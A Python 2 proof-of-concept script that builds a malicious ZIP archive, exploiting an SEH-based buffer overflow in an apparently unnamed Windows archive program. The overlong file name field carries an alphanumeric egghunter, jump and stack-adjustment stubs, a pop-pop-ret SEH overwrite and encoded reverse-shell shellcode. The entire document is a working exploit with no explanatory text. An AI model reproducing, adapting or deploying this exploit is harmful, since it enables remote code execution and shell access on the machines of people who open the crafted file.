#!/usr/bin/python

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print "[+] Building PoC.."

max_size = 4064

revshell  = "w00tw00t"
#revshell += "\xcc\xcc\xcc\xcc"
revshell += b"\x81\xe4\xf0\xff\xff\xff" # and esp, 0xfffffff0 ; align stack

revshell += b"\x89\xe2\xd9\xc2\xd9\x72\xf4\x5d\x55\x59\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
revshell += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
revshell += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
revshell += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
revshell += b"\x39\x6c\x78\x68\x4d\x52\x65\x50\x43\x30\x77\x70"
revshell += b"\x75\x30\x6f\x79\x69\x75\x35\x61\x69\x50\x35\x34"
revshell += b"\x4e\x6b\x70\x50\x66\x50\x6c\x4b\x33\x62\x44\x4c"
revshell += b"\x6c\x4b\x62\x72\x64\x54\x6c\x4b\x32\x52\x47\x58"
revshell += b"\x46\x6f\x6d\x67\x52\x6a\x75\x76\x76\x51\x6b\x4f"
revshell += b"\x4c\x6c\x55\x6c\x71\x71\x31\x6c\x65\x52\x56\x4c"
revshell += b"\x45\x70\x59\x51\x7a\x6f\x46\x6d\x77\x71\x79\x57"
revshell += b"\x68\x62\x7a\x52\x70\x52\x62\x77\x4e\x6b\x72\x72"
revshell += b"\x54\x50\x4c\x4b\x33\x7a\x35\x6c\x4e\x6b\x62\x6c"
revshell += b"\x66\x71\x62\x58\x49\x73\x70\x48\x76\x61\x68\x51"
revshell += b"\x33\x61\x6c\x4b\x71\x49\x61\x30\x47\x71\x69\x43"
revshell += b"\x4e\x6b\x71\x59\x44\x58\x6a\x43\x44\x7a\x62\x69"
revshell += b"\x4e\x6b\x55\x64\x6e\x6b\x66\x61\x4b\x66\x65\x61"
revshell += b"\x59\x6f\x6c\x6c\x5a\x61\x68\x4f\x46\x6d\x67\x71"
revshell += b"\x58\x47\x36\x58\x6d\x30\x34\x35\x78\x76\x64\x43"
revshell += b"\x31\x6d\x49\x68\x65\x6b\x71\x6d\x57\x54\x73\x45"
revshell += b"\x48\x64\x53\x68\x6c\x4b\x52\x78\x47\x54\x75\x51"
revshell += b"\x58\x53\x42\x46\x6c\x4b\x54\x4c\x70\x4b\x4c\x4b"
revshell += b"\x56\x38\x57\x6c\x33\x31\x6a\x73\x6c\x4b\x75\x54"
revshell += b"\x4c\x4b\x67\x71\x6e\x30\x4c\x49\x57\x34\x66\x44"
revshell += b"\x51\x34\x31\x4b\x31\x4b\x65\x31\x43\x69\x33\x6a"
revshell += b"\x30\x51\x4b\x4f\x79\x70\x63\x6f\x31\x4f\x30\x5a"
revshell += b"\x6c\x4b\x72\x32\x48\x6b\x6c\x4d\x71\x4d\x62\x48"
revshell += b"\x56\x53\x65\x62\x75\x50\x77\x70\x50\x68\x61\x67"
revshell += b"\x53\x43\x56\x52\x73\x6f\x30\x54\x62\x48\x72\x6c"
revshell += b"\x42\x57\x36\x46\x65\x57\x79\x6f\x4e\x35\x4d\x68"
revshell += b"\x4e\x70\x67\x71\x45\x50\x65\x50\x51\x39\x68\x44"
revshell += b"\x31\x44\x66\x30\x51\x78\x61\x39\x4d\x50\x32\x4b"
revshell += b"\x55\x50\x69\x6f\x38\x55\x76\x30\x76\x30\x52\x70"
revshell += b"\x62\x70\x47\x30\x50\x50\x51\x50\x56\x30\x32\x48"
revshell += b"\x6b\x5a\x66\x6f\x4b\x6f\x6b\x50\x6b\x4f\x68\x55"
revshell += b"\x6e\x77\x30\x6a\x37\x75\x63\x58\x4b\x70\x69\x38"
revshell += b"\x51\x74\x51\x65\x75\x38\x35\x52\x67\x70\x64\x51"
revshell += b"\x51\x4c\x4d\x59\x6d\x36\x62\x4a\x52\x30\x71\x46"
revshell += b"\x31\x47\x43\x58\x6e\x79\x6c\x65\x43\x44\x71\x71"
revshell += b"\x4b\x4f\x4a\x75\x4b\x35\x49\x50\x63\x44\x44\x4c"
revshell += b"\x39\x6f\x42\x6e\x74\x48\x71\x65\x78\x6c\x31\x78"
revshell += b"\x78\x70\x4d\x65\x39\x32\x43\x66\x59\x6f\x6a\x75"
revshell += b"\x55\x38\x53\x53\x30\x6d\x75\x34\x65\x50\x6b\x39"
revshell += b"\x6a\x43\x61\x47\x56\x37\x66\x37\x66\x51\x39\x66"
revshell += b"\x31\x7a\x35\x42\x73\x69\x53\x66\x6a\x42\x6b\x4d"
revshell += b"\x30\x66\x69\x57\x42\x64\x64\x64\x75\x6c\x35\x51"
revshell += b"\x73\x31\x6c\x4d\x72\x64\x44\x64\x54\x50\x38\x46"
revshell += b"\x77\x70\x71\x54\x33\x64\x70\x50\x43\x66\x70\x56"
revshell += b"\x42\x76\x62\x66\x33\x66\x50\x4e\x63\x66\x70\x56"
revshell += b"\x50\x53\x30\x56\x35\x38\x63\x49\x5a\x6c\x77\x4f"
revshell += b"\x4e\x66\x4b\x4f\x6b\x65\x6d\x59\x6b\x50\x62\x6e"
revshell += b"\x53\x66\x32\x66\x49\x6f\x66\x50\x51\x78\x67\x78"
revshell += b"\x6d\x57\x57\x6d\x75\x30\x69\x6f\x38\x55\x4f\x4b"
revshell += b"\x5a\x50\x4c\x75\x49\x32\x50\x56\x62\x48\x59\x36"
revshell += b"\x6d\x45\x6d\x6d\x4f\x6d\x39\x6f\x38\x55\x45\x6c"
revshell += b"\x73\x36\x63\x4c\x67\x7a\x4d\x50\x79\x6b\x4d\x30"
revshell += b"\x72\x55\x74\x45\x6f\x4b\x63\x77\x36\x73\x73\x42"
revshell += b"\x70\x6f\x42\x4a\x73\x30\x71\x43\x79\x6f\x4a\x75"
revshell += b"\x41\x41"

egghunter = "SYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIE6mQjj9o6opBF2bJDBQH8MFN5l35BzPthoOH2WDpVPbTnkJZLo45xjLoaejGYohgAA"

longJump  = "\x54\x5b"
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x11\x77\x62\x41" ## add  eax, 0x41627711
longJump += "\x05\x12\x66\x52\x41" ## add  eax, 0x41526612
longJump += "\x05\x11\x55\x62\x41" ## add  eax, 0x41625511
longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longJump += "\x50"                 ## push eax
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x33\x41\x76\x13" ## add  eax, 0x13764133
longJump += "\x05\x33\x40\x75\x13" ## add  eax, 0x13754033
longJump += "\x50"                 ## push eax

espAdj = "\x54\x58\x66\x05\x7F\x03\x66\x05\x4C\x04\x50\x5C"

nSeh = "\x74\x9F\x75\x9F"      # NetJump - JE and JNE
Seh  = "\x33\x7a\x40\x00"      # pop pop ret  #  - ascii pop pop ret - 0x00407a33

payload  = "A" * 2
payload += egghunter
payload += "A" * 54
payload += espAdj
payload += longJump
payload += "A" * (297 - len(payload))
payload += nSeh
payload += Seh
payload += revshell
payload += "D" * (max_size - len(payload))
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"
